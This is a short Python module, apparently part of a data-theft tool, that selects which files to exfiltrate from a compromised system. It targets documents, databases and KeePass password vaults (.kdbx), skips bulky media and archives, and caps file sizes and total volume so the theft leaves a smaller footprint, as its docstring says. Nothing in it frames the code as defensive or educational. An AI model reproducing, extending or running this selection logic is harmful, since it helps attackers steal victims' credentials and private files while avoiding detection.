"""Exfil filters. Sending less is the footprint advantage."""
import fnmatch
import re

DEFAULT_RULES = {"include_ext": [".txt", ".json", ".db", ".xml", ".pdf", ".kdbx"],
                 "exclude_ext": [".mp4", ".iso", ".zip", ".tmp", ".log"],
                 "max_file_mb": 8, "max_total_mb": 120,
                 "regex_require": [], "regex_deny": [r"^\s*$"]}


def load(overrides: dict | None = None) -> dict:
    return {**DEFAULT_RULES, **(overrides or {})}


def allow(path: str, size: int, rules: dict, seen_total: int = 0) -> tuple[bool, str]:
    low = path.lower()
    if any(fnmatch.fnmatch(low, f"*{e}") for e in rules["exclude_ext"]):
        return False, "excluded ext"
    if not any(fnmatch.fnmatch(low, f"*{e}") for e in rules["include_ext"]):
        return False, "ext not included"
    if size and size > rules["max_file_mb"] * 1e6:
        return False, "file too large"
    if seen_total + size > rules["max_total_mb"] * 1e6:
        return False, "budget spent"
    return True, "ok"


def content_ok(text: str, rules: dict) -> bool:
    if any(re.search(p, text, re.M) for p in rules["regex_deny"]):
        return False
    return all(re.search(p, text, re.M) for p in rules["regex_require"])
